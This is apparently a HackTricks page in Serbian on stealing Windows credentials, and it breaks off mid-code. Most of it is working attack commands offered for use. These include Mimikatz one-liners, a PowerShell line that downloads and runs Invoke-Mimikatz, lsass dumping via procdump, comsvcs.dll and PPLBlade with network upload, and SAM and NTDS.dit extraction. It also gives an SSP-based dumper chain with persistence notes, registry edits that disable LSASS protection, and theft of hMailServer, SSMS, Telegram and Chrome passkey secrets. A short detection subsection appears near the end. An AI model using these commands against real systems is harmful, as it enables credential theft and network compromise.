# Krađa Windows akreditiva

{{#include ../../banners/hacktricks-training.md}}

## Akreditivi Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Pronađite šta još Mimikatz može da radi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saznajte više o nekim mogućim merama zaštite akreditiva ovde.**](credentials-protections.md) **Ove mere zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**

## Akreditivi uz Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **koji** sam kreirao da biste **tražili lozinke i hash vrednosti** na žrtvi.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto je **Procdump kompanije** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitimni Microsoftov alat**, Defender ga ne detektuje.\
Ovaj alat možete da koristite za **dump lsass procesa**, **preuzimanje dump-a** i **lokalno izvlačenje** **akreditiva** iz dump-a.

Možete da koristite i [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ovaj proces se obavlja automatski pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** korišćenje **procdump.exe za dumpovanje lsass.exe** kao **zlonamerno**, jer **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zato je **manje upadljivo** da se kao **argument** prosledi **PID** procesa lsass.exe komandi procdump, **umesto** imena lsass.exe.

### Dumping lsass pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dumpovanje memorije procesa** u slučaju pada sistema. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je namenjena za pokretanje pomoću `rundll32.exe`.\
Prva dva argumenta nisu bitna, ali je treći podeljen na tri komponente. Prvu komponentu čini ID procesa čiji dump treba napraviti, drugu lokacija dump fajla, a treća komponenta mora striktno biti reč **full**. Druge opcije ne postoje.\
Nakon obrade ove tri komponente, DLL kreira dump fajl i prebacuje memoriju navedenog procesa u taj fajl.\
**comsvcs.dll** se može koristiti za dumpovanje lsass procesa, čime se eliminiše potreba za otpremanjem i pokretanjem procdump-a. Ovaj metod je detaljno opisan na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Za izvršavanje se koristi sledeća komanda:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass-a pomoću Upravljača zadacima**

1. Kliknite desnim tasterom miša na traku zadataka, a zatim kliknite na Upravljač zadacima
2. Kliknite na Više detalja
3. Na kartici Procesi pronađite proces „Local Security Authority Process“
4. Kliknite desnim tasterom miša na proces „Local Security Authority Process“, a zatim kliknite na „Kreiraj dump datoteku“.

### Dumpovanje lsass-a pomoću procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarni fajl koji je potpisao Microsoft i deo je paketa [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Postojeći dump potpunog pada sistema ili njegova komprimovana kopija u dostupnoj korisničkoj fascikli mogu zadržati materijal sa kredencijalima za offline analizu. Nazivi fajlova kao što su `MEMORY.DMP` i `MEMORY.7z` samo su tragovi za proveru: utvrdite poreklo i pristup i nemojte pretpostavljati da sadrže upotrebljive ili aktuelne kredencijale.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass pomoću PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje zaštićenih procesa koji podržava obfuskaciju memory dump-a i prenos na udaljene radne stanice bez zapisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump datoteka radi izbegavanja Defender mehanizama detekcije zasnovanih na potpisima
3. Otpremanje memory dump-a pomoću RAW i SMB metoda, bez zapisivanja na disk (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – LSASS dumping zasnovan na SSP-u bez MiniDumpWriteDump

Ink Dragon koristi dumper u tri faze pod nazivom **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hook-ovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Faza 1: loader (`lals.exe`)** – traži placeholder koji se sastoji od 32 mala slova `d` u `fdp.dll`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita zlonamerni DLL kao novog Security Support Provider-a (SSP).
2. **Faza 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodirani blob u memoriju pre nego što prenese izvršavanje.
3. **Faza 3: dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** razrešene na osnovu heširanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Poseban export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje komprimovani LSASS dump u datoteku i zatvara handle, kako bi eksfiltracija mogla da se obavi kasnije.

Napomene za operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Faza 1 zamenjuje hardkodirani placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami da postavite kako bi LSASS ponovo učitavao SSP pri svakom pokretanju sistema.
* Datoteke `%TEMP%\*.ddt` sadrže komprimovane dumpove. Dekompresujte ih lokalno, pa ih prosledite alatima Mimikatz/Volatility radi izvlačenja akreditiva.
* Za pokretanje `lals.exe` potrebna su admin/SeTcb prava da bi poziv `AddSecurityPackageA` uspeo; po povratku poziva, LSASS neprimetno učitava lažni SSP i izvršava Fazu 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili izbrišite stavku iz registra i ponovo pokrenite LSASS (restartujte sistem), ili je ostavite radi dugoročne perzistencije.

## CrackMapExec

### Dump SAM heševa

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dumpovanje LSA tajni

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit sa ciljnog DC-a

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump istorije lozinki iz NTDS.dit sa ciljnog DC-a

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Prikažite atribut pwdLastSet za svaki nalog u NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Krađa SAM & SYSTEM

Ove datoteke bi trebalo da se **nalaze** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete jednostavno da ih kopirate na uobičajen način** jer su zaštićene.

### Iz registra

Najlakši način da dođete do kopije tih datoteka jeste da je preuzmete iz registra:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Preuzmite** te fajlove na svoju Kali mašinu i **izvucite hash-eve** pomoću:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Možete da kopirate zaštićene fajlove pomoću ove usluge. Potrebna su vam administratorska prava.

#### Using vssadmin

Binarna datoteka vssadmin dostupna je samo u verzijama Windows Server-a.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ali isto možete da uradite iz **Powershell**-a. Ovo je primer **kako da kopirate SAM datoteku** (korišćeni disk je „C:”, a datoteka se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo koje zaštićene datoteke:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da biste napravili kopiju datoteka SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Kredencijali za Active Directory - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce **Active Directory** sistema i sadrži ključne podatke o korisničkim objektima, grupama i njihovom članstvu. U njoj se čuvaju **hash-evi lozinki** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka nalaze se tri primarne tabele:

- **Tabela podataka**: U ovoj tabeli čuvaju se detalji o objektima kao što su korisnici i grupe.
- **Tabela veza**: Prati odnose, kao što je članstvo u grupama.
- **Tabela SD**: Ovde se čuvaju **bezbednosni deskriptori** za svaki objekat, čime se obezbeđuju bezbednost i kontrola pristupa sačuvanim objektima.

Istraživanje Christoffera Anderssona o sloju baze podataka detaljnije dokumentuje ove tabele i njihovo ponašanje u zavisnosti od verzije.<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za interakciju s tom datotekom, a koristi je i _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti **u memoriji `lsass`** (najverovatnije se tamo čuvaju poslednji pristupljeni podaci radi boljih performansi, pomoću **keša**).

#### Dešifrovanje hash-eva u NTDS.dit

Hash se šifruje tri puta:

1. Dešifrujte ključ za šifrovanje lozinki (**PEK**) pomoću **BOOTKEY** ključa i **RC4** algoritma.
2. Dešifrujte **hash** pomoću ključa **PEK** i algoritma **RC4**.
3. Dešifrujte **hash** pomoću algoritma **DES**.

**PEK** ima **istu vrednost na svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** pomoću kontroleru domena specifičnog ključa **BOOTKEY** iz tog kontrolera domena, u hive-u **SYSTEM**. Zato je za izdvajanje kredencijala potrebno imati i **NTDS.dit** i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiranje NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Možete koristiti i trik sa [**volume shadow copy**](#stealing-sam-and-system) da biste kopirali datoteku **ntds.dit**. Imajte na umu da će vam biti potrebna i kopija datoteke **SYSTEM** (ponovo, [**izvucite je iz registra ili upotrebite trik sa volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash vrednosti iz NTDS.dit**

Kada **nabavite** datoteke **NTDS.dit** i **SYSTEM**, možete upotrebiti alate kao što je _secretsdump.py_ da biste **izdvojili hash vrednosti**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Možete ih i **automatski izdvojiti** koristeći važećeg korisnika sa administratorskim privilegijama na domenu:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Za **velike NTDS.dit datoteke** preporučuje se izdvajanje pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit datoteke u SQLite bazu podataka**

NTDS objekti mogu se izdvojiti u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izdvajaju se ne samo tajne već i čitavi objekti i njihovi atributi, što omogućava dodatno izdvajanje informacija kada je sirova NTDS.dit datoteka već preuzeta.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive je opcion, ali omogućava dešifrovanje tajni (NT i LM hash-eva, dodatnih akreditiva kao što su lozinke u čistom tekstu, Kerberos ili trust ključevi, istorije NT i LM lozinki). Između ostalih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenske oznake poslednje prijave i promene lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstva, pouzdani domeni sa tipom, smerom i atributima trust odnosa...

## Lazagne

Preuzmite binarnu datoteku [ovde](https://github.com/AlessandroZ/LaZagne/releases). Ovu binarnu datoteku možete da koristite za izdvajanje akreditiva iz različitih softvera.

```
lazagne.exe all
```

## Drugi alati za izdvajanje akreditiva iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izdvajanje akreditiva iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izdvojite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Izdvajanje akreditiva iz SAM datoteke

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** da biste izvukli lozinke.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

FinalDraft RAT grupe Ink Dragon sadrži tasker `DumpRDPHistory`, čije su tehnike korisne svakom red-teameru:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Odredišta odlaznog RDP saobraćaja** – parsirajte svaki korisnički hive na lokaciji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki potključ čuva ime servera, `UsernameHint` i vreme poslednjeg upisa. Logiku FinalDraft-a možete da replicirate pomoću PowerShell-a:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Dokazi o dolaznim RDP vezama** – pretražite log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za ID-jeve događaja **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao mašinu:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Kada saznate koji Domain Admin se redovno povezuje, dump-ujte LSASS (pomoću LalsDumper/Mimikatz) dok njegova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavljaju njegov verifier i tokene u LSASS-u, koji se zatim mogu ponovo iskoristiti preko SMB/WinRM za preuzimanje `NTDS.dit`-a ili uspostavljanje postojanosti na kontrolerima domena.

### Izmene u registru koje cilja FinalDraft

Isti implant takođe menja nekoliko ključeva registra kako bi olakšao krađu akreditiva:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` onemogućava Restricted Admin za dolazni RDP; ne omogućava pass-the-hash kroz taj režim. Postavljanje vrednosti na `0` dozvoljava Restricted Admin na odredištu, ali klijent mora da zatraži `/RestrictedAdmin` ili da koristi smernicu koja zahteva Restricted Admin.<sup>[[14]](#references)</sup> Sam hash ne daje udaljena administratorska prava; pogledajte [preduslove za RDP autentifikaciju](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, tako da lokalni administratori dobijaju neograničene tokene preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC na mreži, dajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čime pristup memoriji postaje trivijalan za alate za dumpovanje kao što je LalsDumper.

## Akreditivi konfiguracije hMailServer-a (nakon kompromitovanja)

Proverite tačne konfiguracione datoteke `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, u skladu sa rasporedom instalacije. Čitljiva vrednost koja nije prazna za `[Security] AdministratorPassword=` predstavlja hash administratorske lozinke za hMailServer; ona nije dokaz da je reč o lozinci Windows Administrator naloga. Ako se taj akreditive oporavi, za svaki prelazak na Windows nalog potrebno je nezavisno potvrditi ponovnu upotrebu lozinke i prava prijavljivanja.

Kod instalacija koje koriste SQL CE bazu podataka, zasebna vrednost `[Database] Password=` u INI datoteci štiti bazu podataka. U starijim instalacijama ova vrednost je šifrovana Blowfish algoritmom pomoću statičkog ključa `THIS_KEY_IS_NOT_SECRET` i zamena redosleda bajtova u 4-bajtnim rečima. Koristite heksadecimalni niz iz INI datoteke uz ovaj Python isečak koda:<sup>[[2]](#references)</sup>

Najpre proverite da li trenutni nalog može da čita **i INI datoteku i odgovarajuću SQL CE `.sdf` bazu podataka**. Lozinka iz INI datoteke štiti bazu podataka; ona je odvojena od hash vrednosti lozinki mailbox naloga koje su u njoj uskladištene. Pregledajte ili nadogradite **kopiju** baze podataka koja je u upotrebi, nikada aktivnu datoteku.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Pomoću lozinke u čistom tekstu kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provajder i, ako je potrebno, izvršite nadogradnju pre nego što postavite upit za hash vrednosti:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolona `accountpassword` koristi hMailServer format hash-a (hashcat režim `1421`). Probijena lozinka za poštansko sanduče omogućava pivot ka Windows korisniku samo ako taj korisnik ponovo koristi istu lozinku za lokalni/domenski nalog i taj nalog ima potrebna prava za udaljenu prijavu.

## Presretanje LSA povratnog poziva za prijavu (LsaApLogonUserEx2)

Neki alati hvataju **lozinke za prijavu u čistom tekstu** tako što presreću LSA povratni poziv za prijavu `LsaApLogonUserEx2`. Ideja je da se zakači ili omota povratni poziv paketa za autentifikaciju kako bi se akreditivi uhvatili **tokom prijave** (pre heširanja), a zatim zapisali na disk ili vratili operateru. Ovo se obično implementira kao pomoćni program koji se ubacuje u LSA ili se u njega registruje, a zatim beleži svaki uspešan događaj interaktivne/mrežne prijave zajedno sa korisničkim imenom, domenom i lozinkom.<sup>[[1]](#references)</sup>

Operativne napomene:
- Potrebna su lokalna admin/SYSTEM prava za učitavanje pomoćnog programa u putanju autentifikacije.
- Uhvaćeni akreditivi se pojavljuju samo kada dođe do prijave (interaktivne, RDP, prijave servisa ili mrežne prijave, u zavisnosti od hook-a).

## Sačuvani akreditivi za povezivanje u SSMS-u (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva informacije o sačuvanim vezama u datoteci `sqlstudio.bin` za svakog korisnika. Namenski dumperi mogu da parsiraju datoteku i povrate sačuvane SQL akreditive. U shell-ovima koji vraćaju samo izlaz komande, datoteka se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Na strani operatera, ponovo sastavite datoteku i lokalno pokrenite dumper da biste povratili akreditive:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Krađa sesije pregledača i kolačića putem Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Krađa sesije Telegram Desktop `tdata`

Telegram Desktop čuva podatke o autorizaciji i stanju naloga u svom direktorijumu **`tdata`**. Kopirana sesija može se učitati pomoću kompatibilnih alata radi autentifikacije bez lozinke naloga, dok god je ta autorizacija važeća; ako je omogućeno šifrovanje lokalnih podataka, stealeru je potrebna i šifra. Autentifikovana sesija zatim može otkriti podatke o identitetu, metapodatke o razgovorima i članstvima, poruke i medijske sadržaje koji se mogu preuzeti.<sup>[[10]](#references)</sup>

### Pronalaženje i preuzimanje

Pretražite instalirane i prenosive lokacije; nazivi paketa iz Microsoft Store-a se razlikuju, pa izlistajte direktorijume paketa koji sadrže `TelegramMessenge` i pregledajte njihovo podstablo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ako obična čitanja ne uspeju, a token procesa **već sadrži i ima omogućenu** `SeBackupPrivilege`, pristup prilagođen pravljenju rezervnih kopija predstavlja alternativu; on ne pribavlja privilegiju niti podiže nivo privilegija procesa. `CreateFileW` sa `FILE_FLAG_BACKUP_SEMANTICS` može da zatraži semantiku pravljenja rezervnih kopija/obnavljanja i zaobiđe provere bezbednosti datoteka kada su potrebne privilegije tokena prisutne, ali sama zastavica ne zaobilazi nekompatibilno zaključavanje deljenja.<sup>[[10]](#references)[[11]](#references)</sup>

Za datoteke koje su trenutno zaključane, napravite/pročitajte **Volume Shadow Copy**; za datoteke blokirane ACL-om, `robocopy /B` koristi režim pravljenja rezervnih kopija i zaobilazi ACL-ove datoteka i direktorijuma.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant koji vodi računa o propusnom opsegu može prvo da pošalje samo inventar putanja do fajlova, dobije identifikator snimka stanja zajedno sa putanjama koje C2 već čuva, a zatim otpremi samo fajlove koji nedostaju. Zato i mali inkrementalni prenosi nakon rekurzivnog popisivanja `tdata` i dalje mogu da ukazuju na uspešnu krađu sesije.<sup>[[10]](#references)</sup>

### Detekcija i ograničavanje posledica

Korelirajte rekurzivni pristup direktorijumu `tdata` koji obavlja proces koji nije Telegram, sa aktiviranjem privilegije `SeBackupPrivilege`, otvaranjem fajlova sa backup semantikom, VSS aktivnošću ili podređenim procesom `robocopy.exe` koji koristi `/B`. Takođe tražite brzo popisivanje direktorijuma `%APPDATA%` i `%LOCALAPPDATA%\Packages`, nakon čega slede odlazne veze iz istog procesa. Nakon kompromitovanja, koristite **Podešavanja → Uređaji** (ili **Privatnost i bezbednost → Aktivne sesije**) da biste prekinuli neprepoznate sesije; samo uključivanje verifikacije u dva koraka ne opoziva autorizaciju koja je već ukradena.<sup>[[10]](#references)[[13]](#references)</sup>

## Krađa passkey / WebAuthn akreditiva iz Chrome-a na Windows-u

Ako se izvršavanje koda ostvari kao **korisnik žrtva** na Windows hostu koji koristi **Chrome + passkey-e sinhronizovane preko Google Password Manager-a**, passkey-i postaju zanimljiva meta za post-eksploataciju čak i **bez admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** čuva protobuf-kodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da izlista **RP ID**, **korisničko ime**, **ID akreditiva** i šifrovani materijal privatnog ključa za sinhronizovane passkey-je.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** čuva lokalno stanje registracije uređaja, kao što su **`wrapped_identity_private_key`** i umotana tajna koja se koristi za oporavak sinhronizovanih akreditiva.<sup>[[4]](#references)</sup>

Brza trijaža:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blobovi ključeva vezani za TPM i dalje mogu da se zloupotrebe kao lokalni oracle za potpisivanje

Ako pregledač izveze identitetski ključ podržan TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malveru **nije** potrebno da izvuče sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
